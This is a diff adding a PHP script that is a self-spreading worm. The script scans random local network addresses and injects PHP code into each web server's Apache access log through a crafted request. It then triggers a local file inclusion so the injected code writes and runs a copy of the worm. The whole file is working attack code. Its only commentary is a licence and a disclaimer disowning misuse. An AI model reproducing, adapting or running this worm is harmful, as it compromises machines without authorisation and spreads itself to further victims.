@@ -1,0 +1,69 @@
+<?php
+// ----------------------------------------------------------------------------
+// "THE BEER-WARE LICENSE" (Revision 43):
+// <aaronryool@gmail.com> wrote this file. As long as you retain this notice you
+// can do whatever you want with this stuff. If we meet some day, and you think
+// this stuff is worth it, you can buy me a beer in return Aaron R. Yool
+// ----------------------------------------------------------------------------
+// DISCLAIMER:
+// I MadMouse (Aaron R. Yool), am not responsible for the misuse of, (or any use thereof)
+// of this software. Use this software at your own risk, and do not blame me for your
+// stupidity, as I am not responsible for the actions taken by others. I have my own
+// stupidity to be responsible for. lol
+	
+function scan_for_life()
+{
+	while(true)
+	{
+		$host = "192.168.1.".rand(1,255);
+		$socket = stream_socket_client("tcp://$host:80", $errno, $errorMessage);
+		if ($socket === false) continue;
+		else
+		{
+			fwrite($socket, "GET /index.php?page=/var/log/apache2/access.log HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n");
+			$response = stream_get_contents($socket);
+			if(strpos($response,"HTTP/1.1 404 Not Found") !== false)
+			{
+				fclose($socket);
+				continue;
+			}
+			elseif(strpos($response,"Not Found") !== false)
+			{
+				fclose($socket);
+				continue;
+			}
+		}
+		fclose($socket);
+		break;
+	}
+	echo "Host: ".$host." under fire.\n";
+	return $host;
+}
+
+function send_payload($host)
+{
+	$socket = stream_socket_client("tcp://$host:80", $errno, $errorMessage);
+	if ($socket === false) return false;
+	fwrite($socket, "GET /<?php file_put_contents('logwrm.php',base64_decode('".base64_encode(php_strip_whitespace("logwrm.php"))."'));exec(base64_decode('".base64_encode("php logwrm.php > /dev/null &")."')); ?> HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n");
+	fclose($socket);
+	return true;
+}
+
+function run_payload($host)
+{
+	file_get_contents("http://".$host."/index.php?page=/var/log/apache2/access.log");
+}
+
+while(true)
+{
+	echo "\nScanning for a victim\n";
+	$victim = scan_for_life();
+	sleep(1);
+	echo "Sending payload\n";
+	if(!send_payload($victim)) continue;
+	sleep(1);
+	run_payload($victim);
+	echo "PWNED!!!\n";
+}
+
+?>
